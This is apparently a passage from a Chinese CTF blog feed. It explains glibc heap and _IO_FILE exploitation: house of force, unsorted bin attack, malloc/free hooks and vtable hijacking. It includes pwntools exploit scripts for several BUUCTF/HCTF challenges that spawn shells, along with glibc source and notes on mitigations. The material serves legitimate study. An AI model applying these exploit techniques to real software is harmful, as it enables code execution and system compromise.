arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;asm len:&quot;</span>,<span class="built_in">len</span>(binpa))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = 8*b&#x27;\x00&#x27;+binpa+3*b&#x27;\x00&#x27;+p64(0x11)+0x8*b&#x27;a&#x27;+p64(0x21)+p64(rbp-144)</span></span><br><span class="line"><span class="comment">#payload =  8*b&#x27;\x00&#x27;+p64(0x21)+binpa+3*b&#x27;\x00&#x27;+p64(0x21)+0x8*b&#x27;a&#x27;+p64(rbp-176)</span></span><br><span class="line">payload = <span class="number">8</span>*<span class="string">b&#x27;\x00&#x27;</span>+binpa+<span class="number">4</span>*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x41</span>)+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>+<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;give me money~\n&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;how long?\n&quot;</span>,<span class="string">b&#x27;56&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h1><blockquote>
<p>修改top的size字段使其极大，以至于达到可以任意地址分配的目的。</p>
<p>第一次分配先改变top的区域</p>
<p>第二次分配直接获得想要区域的读写权限</p>
</blockquote>
<h2 id="部分代码如下："><a href="#部分代码如下：" class="headerlink" title="部分代码如下："></a>部分代码如下：</h2><blockquote>
<p>此代码为高版本的malloc源码，低版本无：<code> if (__glibc_unlikely (size &gt; av-&gt;system_mem))</code>此判断语句，因此可以利用成功。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="demo："><a href="#demo：" class="headerlink" title="demo："></a>demo：</h2><blockquote>
<p>版本glibc2.23，高版本只要加了patch很容易使此攻击失效</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,ptr2;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    ptr = (<span class="type">long</span>*)((<span class="type">long</span>)(ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">-4120</span>);</span><br><span class="line">    <span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是<code>remainder = chunk_at_offset (victim, nb);</code>语句来改变top的指针指向，改编为victim+nb</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure>

<p>因此可以看出当malloc（负数）的时候，会将top的指针降低到bss段，以此来达到复写bss段的目的。</p>
<figure class="highlight plaintext"><figcaption><span>*p4 </span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 习题：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#hitcontraining_bamboobox)</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./bamboobox&quot;)</span><br><span class="line">#io = remote(&quot;node5.buuoj.cn&quot;,28639)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">def create(size,content):</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;,b&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">    io.sendafter(&quot;Please enter the name of item:&quot;,content)</span><br><span class="line">def show():</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;1&#x27;)</span><br><span class="line">    return io.recvuntil(&quot;\n&quot;).strip()</span><br><span class="line">def change(index,size,content):</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">    io.sendafter(&quot;Please enter the new name of the item:&quot;,content)</span><br><span class="line">def remove(index):</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">def exit():</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;5&#x27;)</span><br><span class="line">create(b&#x27;248&#x27;,24*b&#x27;a&#x27;)</span><br><span class="line">change(b&#x27;0&#x27;,b&#x27;256&#x27;,248*b&#x27;a&#x27;+p64(0xffffffffffffffff))</span><br><span class="line">create(b&#x27;-304&#x27;,8*b&#x27;a&#x27;)</span><br><span class="line">create(b&#x27;24&#x27;,8*b&#x27;a&#x27;+p64(0x0000000000400D49))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">exit()</span><br><span class="line">print(io.recv())</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这道题漏洞很多，这个方法需要flag在正确路径，但是buu远程好像不在，因此需要换一种方法。</p>
<h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin_attack"></a>unsortedbin_attack</h1><h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p>在malloc一个大块时，若unsortedbin中只有一个remindered块，那么就会进行脱链，传递给用户，当然尺寸得足够。</p>
<p>其中会执行<code>bck = victim-&gt;bk;..............;bck-&gt;fd = unsorted_chunks (av);</code>利用此可将bck+0x10所指向的位置的值变得极大。</p>
<p>但是在libc2.35中有指针检查，因此此利用方法在高版本应该会失效。具体patch为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line"><span class="comment">/*此处代码检查了bk指针的伪造，有效防止了此漏洞*/</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="例子：BUUCTF在线评测-buuoj-cn"><a href="#例子：BUUCTF在线评测-buuoj-cn" class="headerlink" title="例子：BUUCTF在线评测 (buuoj.cn)"></a>例子：<a href="https://buuoj.cn/challenges#hitcontraining_magicheap">BUUCTF在线评测 (buuoj.cn)</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28462</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">def create(size,content):</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Size of Heap : &quot;</span>,size)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Index :&quot;</span>, index)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Size of Heap : &quot;</span>, size)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Content of heap : &quot;</span>, content)</span><br><span class="line">def de(index):</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>Index :<span class="string">&#x27;,index)</span></span><br><span class="line"><span class="string">def ex(index):</span></span><br><span class="line"><span class="string">    io.sendafter(b&quot;Your choice :&quot;,b&#x27;</span><span class="number">4&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;24&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;1272&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;b</span><span class="number">&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;24&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;</span>c<span class="number">&#x27;</span>)</span><br><span class="line">de(b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">edit(b<span class="number">&#x27;0&#x27;</span>,b<span class="number">&#x27;48&#x27;</span>,<span class="number">24</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p64(<span class="number">0x501</span>)+p64(<span class="number">0x0000000000602090</span>)+p64(<span class="number">0x0000000000602090</span>))</span><br><span class="line">create(b<span class="number">&#x27;1272&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;e&#x27;</span>)</span><br><span class="line">io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;4869&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br></pre></td></tr></table></figure>



<h1 id="关于hook的一些说明"><a href="#关于hook的一些说明" class="headerlink" title="关于hook的一些说明"></a>关于hook的一些说明</h1><blockquote>
<p>当<code>__malloc_hook</code>和<code>__free_hook</code>中部位null的时候，在执行<code>__libc_free,__libc_malloc</code>会优先执行hook中的函数。</p>
</blockquote>
<p>代码可如下：glibc2.27</p>
<p><img src="/img/mypic/heap/hook.png" alt="hook"></p>
<p>但是在2.35中hook没有了，也就不存在此利用手法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Quickly check that the freed pointer matches the tag for the memory.</span></span><br><span class="line"><span class="comment">     This gives a useful double-free detection.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">char</span> *)mem;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> err = errno;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br></pre></td></tr></table></figure>























]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>heap利用</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>fmtstr一些源码学习</title>
    <url>/2024/08/13/fmtstr/</url>
    <content><![CDATA[<h2 id="1-printf"><a href="#1-printf" class="headerlink" title="1. printf"></a>1. printf</h2><h3 id="a-printf"><a href="#a-printf" class="headerlink" title="a.__printf"></a>a.__printf</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;</span><br><span class="line">  <span class="type">int</span> done;</span><br><span class="line"></span><br><span class="line">  va_start (arg, format);</span><br><span class="line">  done = __vfprintf_internal (<span class="built_in">stdout</span>, format, arg, <span class="number">0</span>);</span><br><span class="line">  va_end (arg);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_printf</span></span><br><span class="line">ldbl_strong_alias (__printf, <span class="built_in">printf</span>);</span><br><span class="line">ldbl_strong_alias (__printf, _IO_printf);</span><br></pre></td></tr></table></figure>

<h3 id="b-vfprintf-internal"><a href="#b-vfprintf-internal" class="headerlink" title="b.__vfprintf_internal"></a>b.__vfprintf_internal</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>fmtstr</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>fmtstr</tag>
      </tags>
  </entry>
  <entry>
    <title>关于_IO_FILE的一些攻击手法</title>
    <url>/2024/08/13/%E5%85%B3%E4%BA%8E-IO-FILE%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</url>
    <content><![CDATA[<h1 id="HCTF-2018the-end"><a href="#HCTF-2018the-end" class="headerlink" title="HCTF 2018the_end"></a>HCTF 2018the_end</h1><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>glibc2.23</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1.虚表劫持</p>
<p>2.虚表函数指针修改（改为one_gadget）</p>
<p>需要选对glibc，否则onegaget打不通…..下面py的libc是错的，但是调试的时候可以观察到会执行onegadget</p>
<p>3.<code>exec /bin/sh 1&gt;&amp;0</code>标准输出重定向</p>
<h2 id="py"><a href="#py" class="headerlink" title="py"></a>py</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(<span class="string">&quot;./the_end&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">io.recvuntil(b<span class="number">&#x27;0</span>x<span class="number">&#x27;</span>)</span><br><span class="line">add = <span class="type">int</span>(io.recvuntil(b<span class="string">&quot;,&quot;</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">io.recv()</span><br><span class="line">oldvatable =add+<span class="number">3108576</span></span><br><span class="line">vtableadd0 =<span class="number">3116784</span>+<span class="number">8</span>+add</span><br><span class="line">vtable =  oldvatable + <span class="number">2272</span></span><br><span class="line">gadget1=add<span class="number">-550310</span></span><br><span class="line">gadget2=add+<span class="number">147956</span></span><br><span class="line">gadget3=add+<span class="number">151703</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">2</span>):</span><br><span class="line">    io.send(p64(vtableadd0+i))</span><br><span class="line">    io.send(p64(vtable)[i:i+<span class="number">1</span>])</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">3</span>):</span><br><span class="line">    io.send(p64(vtable+<span class="number">0x58</span>+i))</span><br><span class="line">    io.send(p64(gadget2)[i:i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<h2 id="关于本题利用方法的一些复盘"><a href="#关于本题利用方法的一些复盘" class="headerlink" title="关于本题利用方法的一些复盘"></a>关于本题利用方法的一些复盘</h2><p>目前io利用方面处于小白的阶段，主要是因为io的实现过于复杂，一堆宏定义反复横跳，并且一些用户函数在处理完很多东西都会跳到io，但是那些用户函数的实现却不仅仅涉及io，因此想要完全分析明白几乎不可能。本题就是在考察exit的执行流，经过无数层函数调用，也会处理到IO。可以在下图的函数调用栈看出：</p>
<p><img src="/img/mypic/io/vtablecheck.png" alt="vtablecheck.png"></p>
<p>此函数会遍历<code>_IO_list_all</code>链表之后调用虚表中的<code>_setbuf</code>函数 ，因此只要覆盖虚表中的函数指针，即可执行想要的函数。但是关于file虚表劫持这件事在libc2.23以后已经成为了过去式，其会判断虚表指针是否在指定范围之内。可看如下代码，并且虚表所处的位置是可读数据段也就是说不可修改，因此此方法基本行不通了，但是有很大的学习意义。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h1><h2 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h2><p>glibc2.23</p>
<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>1.利用FSOP，通过更改_IO_list_all结构体，来改变进行文件流操作时的函数调用。</p>
<p>2.伪造_IO_FILE_plus使其一些成员满足一些特定条件来调用假的虚表中的函数。</p>
<h2 id="py-1"><a href="#py-1" class="headerlink" title="py"></a>py</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29483</span>)</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>,b<span class="number">&#x27;666&#x27;</span>)</span><br><span class="line"><span class="built_in">puts</span> = <span class="type">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>).strip(),<span class="number">16</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, <span class="built_in">puts</span>)</span><br><span class="line">base = <span class="built_in">puts</span> - obj.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(<span class="built_in">puts</span>))</span><br><span class="line">def add(size,name):</span><br><span class="line">    io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Input string Length: \n&quot;</span>,size)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Author name:\n&quot;</span>,name)</span><br><span class="line">def edit(name,con):</span><br><span class="line">    io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;New Author name:\n&quot;</span>,name)</span><br><span class="line">    io.sendafter(<span class="string">&quot;New contents:\n&quot;</span>,con)</span><br><span class="line">def <span class="built_in">exit</span>():</span><br><span class="line">    io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;4&#x27;</span>)</span><br><span class="line">_IO_2_1_stderr_=base+<span class="number">0x3c4540</span></span><br><span class="line">vtableadd =_IO_2_1_stderr_+<span class="number">216</span></span><br><span class="line">bss = base+<span class="number">0x3c3000</span>+<span class="number">0x2000</span></span><br><span class="line">bssbuf = base+<span class="number">0x3c3000</span>+<span class="number">0x2200</span></span><br><span class="line">sys = base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">add(b<span class="number">&#x27;152&#x27;</span>,<span class="number">8</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p64(vtableadd),p64(bss))</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">edit(b<span class="number">&#x27;</span>aaaaaaaa<span class="number">&#x27;</span>+p64(bss),<span class="number">12</span>*p64(sys))</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">payload = b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>+<span class="number">4</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x1</span>)+p64(<span class="number">0x2</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>)</span><br><span class="line">edit(b<span class="number">&#x27;</span>aaaaaaaa<span class="number">&#x27;</span>+p64(_IO_2_1_stderr_),payload)</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;</span>hh<span class="number">&#x27;</span>)</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="疑难"><a href="#疑难" class="headerlink" title="疑难"></a>疑难</h2><p>本题有诸多待解决的问题，利用exit（）无法打通，感觉是因为在exit选项的时候标准输入和标准输出已关闭，但是感觉也可以通过重定向到stderr来解决，需要对文件流的函数执行流程有足够的理解才能完成此构造，未来有机会解决此问题。</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>IO_FILE</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>关于IO_FILE的学习</title>
    <url>/2024/08/11/%E5%85%B3%E4%BA%8EIO-FILE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="一些重要结构体和宏的定义"><a href="#一些重要结构体和宏的定义" class="headerlink" title="一些重要结构体和宏的定义"></a>一些重要结构体和宏的定义</h1><blockquote>
<p>一般放在头文件</p>
</blockquote>
<h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a><code>_IO_FILE</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">    <span class="comment">/*备份和回退操作*/</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"><span class="comment">/*标记所用*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"><span class="comment">/*IO CHAIN利用的关键点*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> 